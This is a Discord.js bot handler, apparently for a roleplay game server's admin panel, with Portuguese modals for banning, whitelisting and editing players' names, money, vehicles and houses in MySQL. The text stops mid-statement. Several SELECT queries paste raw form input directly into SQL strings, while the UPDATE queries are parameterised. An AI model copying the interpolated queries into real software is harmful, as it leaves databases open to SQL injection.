const Discord = require("discord.js");
const config = require("../config.json");

// Database


//const moment = require("moment-timezone");

const mysql = require("mysql");
const connection = mysql.createConnection(config.mysql);

module.exports = {
  name: "paineladm",
  async execute(interaction) {
  //------------------------------- [ SELECT GRUPOS - INTERAÇÃO ] ------------------------------
    if (interaction.isStringSelectMenu() && interaction.customId === "options_player") {
      const option = interaction.values[0];
      if (option === "nome") {
      const modal = new Discord.ModalBuilder()
        .setCustomId("modal_info_player_nome")
        .setTitle(`Trocar nome`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual é o novo nome?")
        .setRequired(true)
        .setMaxLength(15)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");
      const client_info_player_sobrenome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_sobrenome")
        .setLabel("Qual é o novo sobrenome?")
        .setRequired(true)
        .setMaxLength(15)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");
  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      new Discord.ActionRowBuilder().addComponents(client_info_player_sobrenome),
      
      );

      return interaction.showModal(modal);
    } if (option === "idade") {
      const modal = new Discord.ModalBuilder()
      .setCustomId("modal_info_player_idade")
      .setTitle(`Trocar Idade`);

    const client_info_player_id = new Discord.TextInputBuilder()
      .setCustomId("client_update_idnome")
      .setLabel("Qual é o ID do jogador?")
      .setRequired(true)
      .setMaxLength(5)
      .setStyle(1)
      .setPlaceholder("");
    const client_info_player_nome = new Discord.TextInputBuilder()
      .setCustomId("client_nova_idade")
      .setLabel("Qual é o nova idade?")
      .setRequired(true)
      .setMaxLength(3)
      .setStyle(1)
      .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");


  modal.addComponents(
    new Discord.ActionRowBuilder().addComponents(client_info_player_id),
    new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
    
    );

    return interaction.showModal(modal);

    } if (option === "placa"){
      const modal = new Discord.ModalBuilder()
      .setCustomId("modal_info_player_placa")
      .setTitle(`Trocar Placa`);

    const client_info_player_id = new Discord.TextInputBuilder()
      .setCustomId("client_update_placa")
      .setLabel("Qual é o ID do jogador?")
      .setRequired(true)
      .setMaxLength(5)
      .setStyle(1)
      .setPlaceholder("");
    const client_info_player_placa = new Discord.TextInputBuilder()
      .setCustomId("client_nova_placa")
      .setLabel("Qual é a nova placa?")
      .setRequired(true)
      .setMaxLength(8)
      .setMinLength(8)
      .setStyle(1)
      .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS");

  modal.addComponents(
    new Discord.ActionRowBuilder().addComponents(client_info_player_id),
    new Discord.ActionRowBuilder().addComponents(client_info_player_placa),
    
    );

    return interaction.showModal(modal);

    }if (option === "telefone"){
      const modal = new Discord.ModalBuilder()
      .setCustomId("modal_info_player_telefone")
      .setTitle(`Trocar Telefone`);

    const client_info_player_id = new Discord.TextInputBuilder()
      .setCustomId("client_update_telefone")
      .setLabel("Qual é o ID do jogador?")
      .setRequired(true)
      .setMaxLength(5)
      .setStyle(1)
      .setPlaceholder("");
    const client_info_player_placa = new Discord.TextInputBuilder()
      .setCustomId("client_novo_telefone")
      .setLabel("Qual é o novo telefone?")
      .setRequired(true)
      .setMaxLength(7)
      .setMinLength(7)
      .setStyle(1)
      .setPlaceholder("XXX-XXX NÃO USAR LETRAS E COLOCAR O -");

  modal.addComponents(
    new Discord.ActionRowBuilder().addComponents(client_info_player_id),
    new Discord.ActionRowBuilder().addComponents(client_info_player_placa),
    
    );

    return interaction.showModal(modal);

    }
    
      
    }if (interaction.isStringSelectMenu() && interaction.customId === "options_server") {
      const option = interaction.values[0];
      if (option === "addwl") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_whitelist_aprovar")
        .setTitle(`Aprovar Whitelist`);

      const client_id_info = new Discord.TextInputBuilder()
        .setCustomId("id_personagem_addwl")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
        const client_motivo_addwl = new Discord.TextInputBuilder()
        .setCustomId("id_addwl_motivo")
        .setLabel("Qual o motivo ?")
        .setRequired(true)
        .setMaxLength(250)
        .setStyle(2)
        .setPlaceholder("");
  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_id_info),
      new Discord.ActionRowBuilder().addComponents(client_motivo_addwl),
      
      );

      return interaction.showModal(modal);
    } if (option === "remwl") {
      const modal = new Discord.ModalBuilder()
        .setCustomId("modal_remove_wl")
        .setTitle(`Remover Whitelist`);

      const client_id_info = new Discord.TextInputBuilder()
        .setCustomId("id_remwl_player")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_motivo_ban = new Discord.TextInputBuilder()
        .setCustomId("id_remwl_motivo")
        .setLabel("Qual o motivo ?")
        .setRequired(true)
        .setMaxLength(250)
        .setStyle(2)
        .setPlaceholder("");
  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_id_info),
      new Discord.ActionRowBuilder().addComponents(client_motivo_ban),
      
      );

      return interaction.showModal(modal);
    } if(option === "ban"){
      const modal = new Discord.ModalBuilder()
      .setCustomId("modal_ban_player")
      .setTitle(`Banir Jogador`);

    const client_id_ban = new Discord.TextInputBuilder()
      .setCustomId("id_ban_player")
      .setLabel("Qual é o ID a ser banido?")
      .setRequired(true)
      .setMaxLength(5)
      .setStyle(1)
      .setPlaceholder("");
    const client_motivo_ban = new Discord.TextInputBuilder()
      .setCustomId("id_ban_motivo")
      .setLabel("Qual o motivo ?")
      .setRequired(true)
      .setMaxLength(250)
      .setStyle(2)
      .setPlaceholder("");
  modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_id_ban),
      new Discord.ActionRowBuilder().addComponents(client_motivo_ban),
    );
   
    return interaction.showModal(modal);
    } if(option === "unban") {
      const modal = new Discord.ModalBuilder()
      .setCustomId("modal_unban_player")
      .setTitle(`Desbanir Jogador`);

    const client_id_unban = new Discord.TextInputBuilder()
      .setCustomId("id_unban_player")
      .setLabel("Qual é o ID a ser desbanido?")
      .setRequired(true)
      .setMaxLength(5)
      .setStyle(1)
      .setPlaceholder("");
    const client_motivo_unban = new Discord.TextInputBuilder()
      .setCustomId("id_unban_motivo")
      .setLabel("Qual o motivo ?")
      .setRequired(true)
      .setMaxLength(250)
      .setStyle(2)
      .setPlaceholder("");
  modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_id_unban),
      new Discord.ActionRowBuilder().addComponents(client_motivo_unban),
     
    );

    return interaction.showModal(modal);
    }
    
      
    }if (interaction.isStringSelectMenu() && interaction.customId === "options_ifo_player"){
      const option = interaction.values[0];
      if (option === "info") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_info_player")
        .setTitle(`Informações do Jogador`);

      const client_id_info = new Discord.TextInputBuilder()
        .setCustomId("id_info_player")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_id_info),
      
      );

      return interaction.showModal(modal);
      }else if  (option === "infowhid") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_info_player_wl")
        .setTitle(`Verificar HWID`);

      const client_info_player_wl = new Discord.TextInputBuilder()
        .setCustomId("client_info_player_wl")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_wl),
      
      );

      return interaction.showModal(modal);
      }
    }if (interaction.isStringSelectMenu() && interaction.customId === "add_no_player") {
      const option = interaction.values[0];
      if (option === "addinheiro") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_add_dinheiro")
        .setTitle(`Adicionar dinheiro`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_valor")
        .setLabel("Qual o valor?")
        .setRequired(true)
        .setMaxLength(10)
        .setStyle(1)
        .setPlaceholder("COLOCAR APENAS NÚMEROS");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );

      return interaction.showModal(modal);
      }else if (option === "addveh") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_vehicle_player")
        .setTitle(`Adicionar veiculo`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual o veiculo?")
        .setRequired(true)
        .setMaxLength(20)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );

      return interaction.showModal(modal);
      }else if (option === "addhome") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_addcasa")
        .setTitle(`Adicionar casa`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual o nome da casa?")
        .setRequired(true)
        .setMaxLength(20)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );
      return interaction.showModal(modal);
      }else if (option === "addblack") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_addblack")
        .setTitle(`Remover Blacklist`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id)
      
      );

      return interaction.showModal(modal);
      }else if (option === "addgroup") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_addgroup")
        .setTitle(`Adicionar cargo`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual o cargo?")
        .setRequired(true)
        .setMaxLength(20)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );

      return interaction.showModal(modal);
   
    }
    
    }if (interaction.isStringSelectMenu() && interaction.customId === "rem_do_player") {
      const option = interaction.values[0];
      if (option === "remdinheiro") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_info_remove_din")
        .setTitle(`Remover dinheiro`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_valor")
        .setLabel("Qual o valor?")
        .setRequired(true)
        .setMaxLength(10)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );

      return interaction.showModal(modal);
      }else if (option === "remveh") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_info_remveh")
        .setTitle(`Remover veiculo`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual o veiculo?")
        .setRequired(true)
        .setMaxLength(20)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );

      return interaction.showModal(modal);
      }else if (option === "remhome") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_remcasa")
        .setTitle(`Remover casa`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual o nome da casa?")
        .setRequired(true)
        .setMaxLength(20)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );
      return interaction.showModal(modal);
      }else if (option === "remblack") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_info_rembl")
        .setTitle(`Remover Blacklist`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_motivo = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual é o Motivo?")
        .setRequired(true)
        .setMaxLength(150)
        .setStyle(1)
        .setPlaceholder("");
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_motivo)
      
      );

      return interaction.showModal(modal);
      }else if (option === "remgroup") {
        const modal = new Discord.ModalBuilder()
        .setCustomId("modal_info_remgp")
        .setTitle(`Remover cargo`);

      const client_info_player_id = new Discord.TextInputBuilder()
        .setCustomId("client_update_idnome")
        .setLabel("Qual é o ID do jogador?")
        .setRequired(true)
        .setMaxLength(5)
        .setStyle(1)
        .setPlaceholder("");
      const client_info_player_nome = new Discord.TextInputBuilder()
        .setCustomId("client_novo_nome")
        .setLabel("Qual o cargo?")
        .setRequired(true)
        .setMaxLength(20)
        .setStyle(1)
        .setPlaceholder("NÃO COLOCAR CARACTERS ESPECIAIS NEM ESPAÇO");

  
    modal.addComponents(
      new Discord.ActionRowBuilder().addComponents(client_info_player_id),
      new Discord.ActionRowBuilder().addComponents(client_info_player_nome),
      
      );

      return interaction.showModal(modal);
   
    }

  }
//--------------------------------- [ SELECT GRUPOS - MATRIZ ] -------------------------------------------------------
    if (interaction.isButton() && interaction.customId === "update_jogador") {
      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_primary)
            .setDescription(
              `✅ | Painel de gestão do jogador aberto, escolha uma opção:`
            ),
        ],
        components: [
          new Discord.ActionRowBuilder().addComponents(
            new Discord.StringSelectMenuBuilder()
              .setCustomId("options_player")
              .setPlaceholder("Escolha uma opção!")
              .addOptions(
                { label: "📝- Nome", value: `nome` },
                { label: "📝- Placa", value: `placa` },
                { label: "📝- Idade", value: `idade` },
                { label: "📝- Telefone", value: `telefone` }
              )
          ),
        ],
        ephemeral: true,
      });

    }if (interaction.isButton() && interaction.customId === "update_server") {
      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_primary)
            .setDescription(
              `✅ | Painel de gestão do servidor aberto, escolha uma opção:`
            ),
        ],
        components: [
          new Discord.ActionRowBuilder().addComponents(
            new Discord.StringSelectMenuBuilder()
              .setCustomId("options_server")
              .setPlaceholder("Escolha uma opção!")
              .addOptions(
                { label: "✅- Aprovar WL", value: `addwl` },
                { label: "❌- Remover WL", value: `remwl` },
                { label: "✅- Desbanir Jogador", value: `unban` },
                { label: "❌- Banir Jogador", value: `ban` }
              )
          ),
        ],
        ephemeral: true,
      });

    }if (interaction.isButton() && interaction.customId === "inform_do_jogador") {
      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_primary)
            .setDescription(
              `✅ | Painel de informações do jogador, escolha uma opção:`
            ),
        ],
        components: [
          new Discord.ActionRowBuilder().addComponents(
            new Discord.StringSelectMenuBuilder()
              .setCustomId("options_ifo_player")
              .setPlaceholder("Escolha uma opção!")
              .addOptions(
                { label: "📋- Identidade do jogador", value: `info` },
                { label: "📋- Contas do jogador", value: `infowhid` }
                
              )
          ),
        ],
        ephemeral: true,
      });

    }if (interaction.isButton() && interaction.customId === "adicionar_ao_jogador") {
      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_success)
            .setDescription(
              `✅ | Painel de informações do jogador, escolha uma opção:`
            ),
        ],
        components: [
          new Discord.ActionRowBuilder().addComponents(
            new Discord.StringSelectMenuBuilder()
              .setCustomId("add_no_player")
              .setPlaceholder("Escolha uma opção!")
              .addOptions(
                { label: "💵- Dinheiro", value: `addinheiro` },
                { label: "🚗- Veiculos", value: `addveh` },
                { label: "🏠- Casas", value: `addhome` },
                //{ label: "⛔- Blacklist", value: `addblack` },
                { label: "💼- Cargo", value: `addgroup` },
                
              )
          ),
        ],
        ephemeral: true,
      });

    }if (interaction.isButton() && interaction.customId === "remover_do_jogador") {
      interaction.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor(config.embeds_color.embed_success)
            .setDescription(
              `✅ | Painel de informações do jogador, escolha uma opção:`
            ),
        ],
        components: [
          new Discord.ActionRowBuilder().addComponents(
            new Discord.StringSelectMenuBuilder()
              .setCustomId("rem_do_player")
              .setPlaceholder("Escolha uma opção!")
              .addOptions(
                { label: "💵- Dinheiro", value: `remdinheiro` },
                { label: "🚗- Veiculos", value: `remveh` },
                { label: "🏠- Casas", value: `remhome` },
                { label: "⛔- Blacklist", value: `remblack` },
                { label: "💼- Cargo", value: `remgroup` },
                
              )
          ),
        ],
        ephemeral: true,
      });

    }


// --------------------------------- [ MODULOS DE EXECUÇÃO SERVIDOR] --------------------------------------------------

if (interaction.isModalSubmit() && interaction.customId === "modal_ban_player") {
  let jogador = interaction.fields.getTextInputValue("id_ban_player");
  let motivo = interaction.fields.getTextInputValue("id_ban_motivo");
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela} WHERE id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET banned = '1' WHERE id = ?`,
          [config.wl.nome_tabela, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao banir o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache
            .get(config.geral.canal_banidos)
            .send({
              embeds: [
                new Discord.EmbedBuilder()
                  .setColor(config.embeds_color.embed_success)
                  .setAuthor({
                    name: interaction.guild.name,
                    iconURL: interaction.guild.iconURL({ dynamic: true }),
                  })
                  .setTitle(`Registro de BAN | ${config.geral.nome_servidor} `)
                  .setDescription(
                    `>>> **[ID]: ${jogador}**\n[DISCORD]: <@${result[0].discord}> \n[POR]: <@${interaction.user.id}> \n [MOTIVO]: ${motivo}`
                  )
                  .setImage(`${config.imagens.ticket_footer}`),
              ],
            });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, jogador banido com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );
}
if (interaction.isModalSubmit() && interaction.customId === "modal_unban_player") {
  let jogador = interaction.fields.getTextInputValue("id_unban_player");
  let motivo = interaction.fields.getTextInputValue("id_unban_motivo");
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela} WHERE id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET banned = '0' WHERE id = ?`,
          [config.wl.nome_tabela, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao desbanir o jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache.get(config.geral.canal_logs).send({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setAuthor({
                  name: interaction.guild.name,
                  iconURL: interaction.guild.iconURL({ dynamic: true }),
                })
                .setTitle(`Registro de UNBAN | ${config.geral.nome_servidor} `)
                .setDescription(
                  `>>> **[ID]: ${jogador}**\n[DISCORD]: <@${result[0].discord}> \n[POR]: <@${interaction.user.id}> \n [MOTIVO]: ${motivo}`
                )
                .setImage(`${config.imagens.ticket_footer}`),
            ],
          });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, jogador desbanido com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );
}
if (interaction.isModalSubmit() && interaction.customId === "modal_remove_wl") {
  let jogador = interaction.fields.getTextInputValue("id_remwl_player");
  let motivo = interaction.fields.getTextInputValue("id_remwl_motivo");
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela} WHERE id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET whitelisted = '0' WHERE id = ?`,
          [config.wl.nome_tabela, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao remover a WL do jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache.get(config.geral.canal_logs).send({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setAuthor({
                  name: interaction.guild.name,
                  iconURL: interaction.guild.iconURL({ dynamic: true }),
                })
                .setTitle(`Registro de REMOÇÃO DE WHITELIST | ${config.geral.nome_servidor} `)
                .setDescription(
                  `>>> **[ID]: ${jogador}**\n[DISCORD]: <@${result[0].discord}> \n[POR]: <@${interaction.user.id}> \n [MOTIVO]: ${motivo}`
                )
                .setImage(`${config.imagens.ticket_footer}`),
            ],
          });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Whitelist removida com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );
}
if (interaction.isModalSubmit() && interaction.customId === "modal_whitelist_aprovar") {
  let jogador = interaction.fields.getTextInputValue("id_personagem_addwl");
  let motivo = interaction.fields.getTextInputValue("id_addwl_motivo");
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela} WHERE id = ${jogador}`,
    function (err, result, fields) {
      if (err) throw err;
      if (result.length === 0) {
        interaction.reply({
          embeds: [
            new Discord.EmbedBuilder()
              .setColor(config.embeds_color.embed_success)
              .setDescription(
                `❌ | Olá ${interaction.user}, jogador inexistente!.`
              ),
          ],
          ephemeral: true,
        });
        return;
      } else {
        const query = connection.format(
          `UPDATE ?? SET whitelisted = '1' WHERE id = ?`,
          [config.wl.nome_tabela, jogador]
        );
        connection.query(query, (err, rows) => {
          if (err) {
            console.error(err);
            return interaction.reply({
              content: "Ocorreu um erro ao adicionar a WL do jogador.",
              ephemeral: true,
            });
          }
          interaction.guild.channels.cache.get(config.geral.canal_logs).send({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setAuthor({
                  name: interaction.guild.name,
                  iconURL: interaction.guild.iconURL({ dynamic: true }),
                })
                .setTitle(`Registro de LIBERAÇÃO DE WHITELIST | ${config.geral.nome_servidor} `)
                .setDescription(
                  `>>> **[ID]: ${jogador}**\n[DISCORD]: <@${result[0].discord}> \n[POR]: <@${interaction.user.id}> \n [MOTIVO]: ${motivo}`
                )
                .setImage(`${config.imagens.ticket_footer}`),
            ],
          });
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setDescription(
                  `✅ | Olá ${interaction.user}, Whitelist aprovada com sucesso!.`
                ),
            ],
            ephemeral: true,
          });
        });
      }
    }
  );
}
// ---------------------------------- [ MODULOS DE EXECUÇÃO IDENTIDADE] ------------------------------------------------

if (interaction.isModalSubmit() && interaction.customId === "modal_info_player") {
  const jogador = interaction.fields.getTextInputValue("id_info_player");
  connection.query(
    `SELECT * FROM ${config.wl.nome_tabela_identidade} WHERE user_id = ${jogador}`,
    function (err, result, fields) {
      if (err) {
        console.error(err);
        interaction.reply({
          content: "Ocorreu um erro ao buscar as informações do jogador. Por favor, tente novamente mais tarde.",
          ephemeral: true,
        });
        return;
      }
      
      const { name, firstname, age, registration, phone } = result[0];
      connection.query(
        `SELECT * FROM ${config.wl.nome_tabela} WHERE id = ${jogador}`,
        function (err, result, fields) {
          if (err) {
            console.error(err);
            interaction.reply({
              content: "Ocorreu um erro ao buscar as informações do jogador. Por favor, tente novamente mais tarde.",
              ephemeral: true,
            });
            return;
          }
          const { discord, steam } = result[0];
          connection.query(
            `SELECT COUNT(*) as total_contas FROM ${config.wl.nome_tabela_ids} WHERE steam = '${result[0].steam}'`,
            function (err, results, fields) {
              if (err) {
                console.error(err);
                interaction.reply({
                  content: "Ocorreu um erro ao buscar as informações do jogador. Por favor, tente novamente mais tarde.",
                  ephemeral: true,
                });
                return;
              }
              const contas = results[0].total_contas;
              interaction.reply({
                embeds: [
                  new Discord.EmbedBuilder()
                    .setColor(config.embeds_color.embed_success)
                    .setAuthor({
                      name: interaction.guild.name,
                      iconURL: interaction.guild.iconURL({ dynamic: true }),
                    })
                    .setDescription(` Olá ${interaction.user} .`)
                    .addFields(
                      { name: "**Veja abaixo os dados do jogador: **\n", value:`\n**[NOME]:** ${name} ${firstname}\n **[IDADE]: ** ${age}\n**[REGISTRO]: **${registration} \n**[TELEFONE]: ** ${phone} 
                      **[DISCORD]: ** <@${discord}> \n **[STEAM]: **||${steam}|| \n**[CONTAS]: ** ${contas} ` },
                    )
                    .setFooter({ text: `Copyright © `+ config.geral.nome_servidor })
                    .setImage(`${config.imagens.ticket_footer}`),
                ],
                
                ephemeral: true,
              });
            }
          );
        }
      );
    }
  );


}
if (interaction.isModalSubmit() && interaction.customId === "modal_info_player_wl") {
  const jogador = interaction.fields.getTextInputValue("client_info_player_wl");
  let donoID
  connection.query(
    `SELECT steam FROM ${config.wl.nome_tabela_ids} WHERE id = '${jogador}'`,
    function (err, result, fields) {
      if (err) {
        console.error(err);
        interaction.reply({
          content: "Ocorreu um erro ao buscar as informações do jogador. Por favor, tente novamente mais tarde.",
          ephemeral: true,
        });
        return;
      }
      const steam = result[0].steam;
      connection.query(
        `SELECT id, steam FROM ${config.wl.nome_tabela_ids} WHERE steam = '${steam}'`,
        function (err, results, fields) {
          if (err) {
            console.error(err);
            interaction.reply({
              content: "Ocorreu um erro ao buscar as informações do jogador. Por favor, tente novamente mais tarde.",
              ephemeral: true,
            });
            return;
          }
          const usersList = results.map(user => `**[ID]**: ${user.id}\n **[STEAM]**: ${user.steam}\n`).join('\n');
          connection.query(
            `SELECT * FROM ${config.wl.nome_tabela} WHERE id = ${jogador}`,
            function (err, result, fields) {
              donoID = result[0].discord
              if (err) {
                console.error(err);
                interaction.reply({
                  content: "Ocorreu um erro ao buscar as informações do jogador. Por favor, tente novamente mais tarde.",
                  ephemeral: true,
                });
                return;
              }
              
           
          interaction.reply({
            embeds: [
              new Discord.EmbedBuilder()
                .setColor(config.embeds_color.embed_success)
                .setAuthor({
                  name: interaction.guild.name,
